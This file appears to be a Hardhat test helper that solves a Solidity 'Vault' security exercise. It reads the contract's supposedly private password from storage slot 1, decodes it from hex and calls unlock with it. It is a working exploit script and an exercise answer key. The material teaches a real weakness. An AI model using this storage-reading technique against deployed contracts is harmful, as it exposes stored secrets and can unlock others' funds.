import { expect } from "chai";
import { ethers, waffle } from "hardhat";
import internal from "stream";
/**
 * 
 * https://medium.com/coinmonks/a-quick-guide-to-hack-private-variables-in-solidity-b45d5acb89c0
 */

/*  0x412076657279207374726f6e672070617373776f726400000000000000000000
 * storage is returned in big endian
 * (ex: if you were to search slot 0 it'd be 0x....1) because boolean is in first bit of 0th slot
 */
const hexToAscii = (hex: string): string => {
  let ascii: string = '';
  // start at index 2 so we don't convert the 0x format prefix
  for(let i = 2 ; i < hex.length ; i+=2) {
    let sub = hex.substring(i, i+2);
    ascii += String.fromCharCode(parseInt(sub, 16));
  }
  return ascii;
}

const asciiToBytes = (ascii: string): number[] => {
  const bytes = [];
  for(let i = 0; i < ascii.length; i++) {
    bytes.push(ascii.charCodeAt(i));
  }
  return bytes;
}

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const provider = waffle.provider;
  const storageSlotOne = await provider.getStorageAt(victim.address, 1);
  // you don't need to trim the output bc empty spaces would already be converted
  const password = hexToAscii(storageSlotOne);
  console.log(`password is ${password}.`);
  const passwordAsBytes = asciiToBytes(password);
  await victim.unlock(passwordAsBytes);
};

export default helper;
